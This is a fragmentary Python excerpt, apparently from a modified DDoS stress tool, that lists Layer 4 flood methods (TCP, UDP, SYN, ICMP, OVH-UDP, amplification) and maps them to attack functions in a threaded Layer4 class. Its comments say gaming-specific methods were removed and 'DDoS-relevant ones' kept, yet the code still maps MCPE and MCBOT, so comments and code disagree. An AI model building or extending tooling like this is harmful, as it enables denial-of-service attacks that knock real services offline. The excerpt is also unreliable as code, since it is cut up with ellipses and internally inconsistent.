...
class Methods:
    # Keep only non-gaming Layer7 methods and common L4 methods (removed gaming-specific methods)
    ...
    # Removed gaming-specific layer4 methods (MINECRAFT, MCBOT, VSE, TS3, MCPE, FIVEM, etc.)
    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN",
                                "CONNECTION", "CPS", "ICMP", "OVH-UDP",
                                }
...
class Layer4(Thread):
    ...
    def __init__(self,
        ...
        # Removed gaming-related L4 methods and kept DDoS-relevant ones
        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "MCPE": self.MCPE if hasattr(self, "MCPE") else self.TCP,  # fallback, kept for compatibility if file still references it
            "MCBOT": self.TCP,
            "OVH-UDP": self.OVHUDP,
            "CPS": self.CPS,
